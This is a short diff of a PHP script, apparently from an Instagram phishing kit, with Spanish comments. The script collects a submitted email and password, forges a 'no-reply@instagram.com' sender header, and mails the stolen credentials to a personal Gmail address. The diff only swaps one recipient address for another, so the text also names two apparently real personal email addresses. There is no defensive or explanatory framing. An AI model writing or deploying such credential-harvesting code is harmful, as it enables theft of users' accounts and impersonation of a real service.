@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Validaciones básicas
     if (!empty($email) && !empty($password)) {
-        $to = "matiasleonelibarra37@gmail.com"; // Cambia esto a tu correo
+        $to = "ibarraleonelmatias73@gmail.com"; // Cambia esto a tu correo
         $subject = "Nuevo inicio de sesión en Instagram";
         $message = "Correo: $email\nContraseña: $password";
         $headers = "From: no-reply@instagram.com";
